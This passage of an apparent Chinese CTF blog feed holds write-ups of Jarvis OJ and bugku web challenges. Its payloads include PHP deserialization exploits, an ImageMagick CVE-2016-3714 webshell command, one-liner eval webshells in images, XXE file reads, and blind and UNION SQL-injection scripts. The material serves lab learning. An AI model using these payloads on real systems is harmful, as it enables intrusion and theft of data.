[212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],</span><br><span class="line">   [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],</span><br><span class="line">   [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],</span><br><span class="line">   [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],</span><br><span class="line">   [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],</span><br><span class="line">   [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],</span><br><span class="line">   [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],</span><br><span class="line">   [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],</span><br><span class="line">   [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],</span><br><span class="line">   [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],</span><br><span class="line">   [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],</span><br><span class="line">   [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],</span><br><span class="line">   [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],</span><br><span class="line">   [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],</span><br><span class="line">   [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]])</span><br><span class="line">x=solve(o,r)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    char=chr(int(round(x[i])))</span><br><span class="line">    flag+=char</span><br><span class="line">    <span class="built_in">print</span>(char)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p><h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is <span class="built_in">wait</span> <span class="keyword">for</span> you</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">php反序列化总结</a><br><br>建立一个html文件，写入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p><a href="http://php.net/manual/zh/function.scandir.php" target="_blank" rel="noopener">scandir</a><br><br><a href="http://www.w3school.com.cn/php/func_filesystem_dirname.asp" target="_blank" rel="noopener">dirname</a><br><br>序列化，然后将html文件上传的包的文件名修改为下面序列化的值加上|,为防止转义，在”上加入\。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO&#123;</span><br><span class="line">    public <span class="variable">$mdzz</span>=<span class="string">'var_dump(scandir(dirname(__FILE__))'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$qianye</span>=new OowoO();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$qianye</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>抓包文件名修改为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryCyObcbKufPxtAZ5Q</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;"</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;!-- UY BEGIN --&gt;</span><br><span class="line">&lt;div id=<span class="string">"uyan_frame"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"http://v2.uyan.cc/code/uyan.js?uid=2157721"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- UY END --&gt;</span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"http://7u2ss1.com1.z0.glb.clouddn.com/love.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryCyObcbKufPxtAZ5Q--</span><br></pre></td></tr></table></figure></p><p>得到flag所在的文件。<br>由phpino.php和flag文件在同一目录下，和phpinfo上的信息可知<br>进一步修改文件名为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure></p><p>得到flag</p><h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><p><a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">CVE-2016-3714 - ImageMagick 命令执行分析</a><br><br>访问test.php得到phpinfo的相关信息。看到imagick<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32790/test.php</span><br></pre></td></tr></table></figure></p><p>利用exiftool生成一句话木马<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool -label=<span class="string">"\"|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/y.php; \""</span> 1.png</span><br></pre></td></tr></table></figure></p><p>然后上传文件的时候需要注意需要filetype=show或者filetype=win。在uploads上生成x.php<br>上传后用菜刀链接。这里我一直上传，连接失败。好像被别人上传了删除脚本</p><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><p><a href="http://chybeta.club/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">xml注入实体攻击</a><br><br>从源码中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">XHR</span></span>() &#123;</span><br><span class="line">        var xhr;</span><br><span class="line">        try &#123;xhr = new XMLHttpRequest();&#125;</span><br><span class="line">        catch(e) &#123;</span><br><span class="line">            var IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (var i=0,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                try &#123;xhr = new ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                catch(e) &#123;<span class="built_in">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">send</span></span>()&#123;</span><br><span class="line"> evil_input = document.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> var xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==4 &amp;&amp; xhr.status==201) &#123;</span><br><span class="line">             data = JSON.parse(xhr.responseText);</span><br><span class="line">             tip_area = document.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以知道向/api/v1.0/try发送post请求。<br>抓包改包，将Content-Type改为application/xml，然后post数据如下:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">"file:////home/ctf/flag.txt"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><h1 id="simple-inject"><a href="#simple-inject" class="headerlink" title="simple inject"></a>simple inject</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">payloads=string.printable</span><br><span class="line">url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></span><br><span class="line"><span class="comment">#ye= "'/**/or/**/if(substring((select/**/database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"</span></span><br><span class="line"><span class="comment">#ye= "'/**/or/**/if(substring((select/**/group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database())/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"</span></span><br><span class="line">ye = <span class="string">"'/**/or/**/if(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='admin')/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"</span></span><br><span class="line"><span class="comment">#ye = "'/**/or/**/if(substring((select/**/password/**/from/**/admin)/**/from/**/%s/**/for/**/1)='%s',0,1)/**/and/**/'1'='1"</span></span><br><span class="line">def exp(i,x):</span><br><span class="line">data=&#123;<span class="string">'username'</span>:ye%(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">response = requests.post(url,data = data)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">'用户名错误'</span>)&gt;0:</span><br><span class="line"><span class="built_in">return</span> 1</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line"><span class="built_in">return</span> 0</span><br><span class="line">ans=<span class="string">''</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,100):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> payloads:</span><br><span class="line"><span class="keyword">if</span> exp(i,x)==1:</span><br><span class="line">ans+=x</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32785/index.php?page=submit</span><br><span class="line">http://web.jarvisoj.com:32785/index.php?page=view</span><br></pre></td></tr></table></figure><p>从以上连接猜测是文件包含<br>在submit中上传一张一句话木马jpg图片，然后在view页面中找到，该图片的地址。访问<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg</span><br></pre></td></tr></table></figure></p><p>显示打开失败，从报错消息中得知，查询时，给图片加上php后缀。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> fopen(uploads/1520757670.jpg.php): failed to open stream: No such file or directory <span class="keyword">in</span> /opt/lampp/htdocs/index.php on line 24</span><br><span class="line">No such file!</span><br></pre></td></tr></table></figure></p><p>%00截断，得到flag，一开始只是上传一张图片，没有flag，上传有一句话的图片，才得到flag，搞不到为什么？<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32785/index.php?page=uploads/1520757670.jpg%00</span><br></pre></td></tr></table></figure></p><p>ps:一句话图片可以用edjpgcom制作，一句话为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'Qianye'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><h1 id="flag在管理员的手里"><a href="#flag在管理员的手里" class="headerlink" title="flag在管理员的手里"></a>flag在管理员的手里</h1><p>最近一直遇到源码泄露，习惯性地index.php~,得到源码，打开后有点乱，在kail中，<code>file index.php</code> 得到信息<code>index.php: Vim swap file, version 7.4</code>.添加后缀为<code>index.php.swp</code> ,<code>vi -r index.php.swp</code>得到如下整齐的源码。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">"guest"</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</span><br><span class="line">setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</span><br><span class="line">setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="http://www.w3school.com.cn/php/func_string_strrev.asp" target="_blank" rel="noopener">strtev</a><br></p><h1 id="re"><a href="#re" class="headerlink" title="re?"></a>re?</h1><p><a href="https://err0rzz.github.io/2017/12/26/UDF-mysql/#linux下" target="_blank" rel="noopener">UDF-mysql</a></p><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>查看页面源码，访问index.phps得到源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line"><span class="built_in">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">"1112 is a nice lab!"</span> and <span class="variable">$id</span>==0 and strlen(<span class="variable">$b</span>)&gt;5 and eregi(<span class="string">"111"</span>.substr(<span class="variable">$b</span>,0,1),<span class="string">"1114"</span>) and substr(<span class="variable">$b</span>,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">require(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当$a为php://input，$data可以通过php://input来接受post数据。$id传一个字符进去，会被转换为0。对$b，要求长度大于5，其次要求满足eregi的要求和首字母不为4。可以设置$b为%00123456，这样，substr（）会发生截断，在匹配时时进行eregi(“111”,”1114”)满足，同时%00对strlen不会发生截断。<br><br>火狐发送post请求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%00123456</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1112 is a nice lab!</span><br></pre></td></tr></table></figure></p><p>得到<code>Come ON!!! {/^HT2mCpcvOLf}</code> <br><br>访问<code>http://web.jarvisoj.com:32780//^HT2mCpcvOLf</code> 连接自动补全<br>猜测是注入，过滤了空格，union,select,from <br><br>查看字段数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>查看显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>查表<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(table_name)/*1*/frofromm/*1*/information_schema.tables/*1*/<span class="built_in">where</span>/*1*/table_schema=database())%23</span><br></pre></td></tr></table></figure></p><p>查字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/<span class="built_in">where</span>/*1*/table_name=0x636F6E74656E74)%23</span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uunionnion/*1*/selecselectt/*1*/1,2,(selselectect/*1*/group_concat(context)/*1*/frofromm/*1*/content)%23</span><br></pre></td></tr></table></figure></p><h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><p>访问图片链接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">require_once(<span class="string">'shield.php'</span>);</span><br><span class="line"><span class="variable">$x</span> = new Shield();</span><br><span class="line">isset(<span class="variable">$_GET</span>[<span class="string">'class'</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$g</span>)) &#123;</span><br><span class="line"><span class="variable">$x</span> = unserialize(<span class="variable">$g</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$x</span>-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>将shield.php精心base64加密，接在img=后面，访问以下连接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//flag is <span class="keyword">in</span> pctf.php</span><br><span class="line">class Shield &#123;</span><br><span class="line">public <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">function</span> __construct(<span class="variable">$filename</span> = <span class="string">''</span>) &#123;</span><br><span class="line"><span class="variable">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">readfile</span></span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$this</span>-&gt;file) &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'..'</span>)===FALSE  </span><br><span class="line">&amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'/'</span>)===FALSE &amp;&amp; stripos(<span class="variable">$this</span>-&gt;file,<span class="string">'\\'</span>)==FALSE) &#123;</span><br><span class="line"><span class="built_in">return</span> @file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用以下的脚本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Shield &#123;</span><br><span class="line">public <span class="variable">$file</span> = <span class="string">"pctf.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$qianye</span> = new Shield();</span><br><span class="line">print_r(serialize(<span class="variable">$qianye</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问以下链接，查看源码，得到flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">SQL injection with raw MD5 hashes</a><br><br>bp抓包，在应答包中发现<code>Hint: &quot;select * from</code>admin<code>where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code><br>在之前的做题中遇到过。直接提交<code>ffifdyop</code>,得到flag</p><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.01</span><br></pre></td></tr></table></figure></p><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p>因为校园网，出路由的时候会变端口，所以在vps上跑<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl --<span class="built_in">local</span>-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku的代码审计和社工</title>
      <link href="/posts/ecb3eea4.html"/>
      <url>/posts/ecb3eea4.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>都做过了，在做一遍，刷理一下思绪。<br><a id="more"></a><br><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">php函数漏洞详细总结</a></p><h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">变量覆盖漏洞</a><br><br>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?shiyan&amp;content=</span><br></pre></td></tr></table></figure></p><h1 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) </span><br><span class="line">&#123; if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）</span><br><span class="line">    die(&apos;Flag: &apos;.$flag); </span><br><span class="line">   else print &apos;No&apos;;&#125;?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/cherrie007/article/details/77473817" target="_blank" rel="noopener">strcmp漏洞php5.3之前</a><br><br>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span 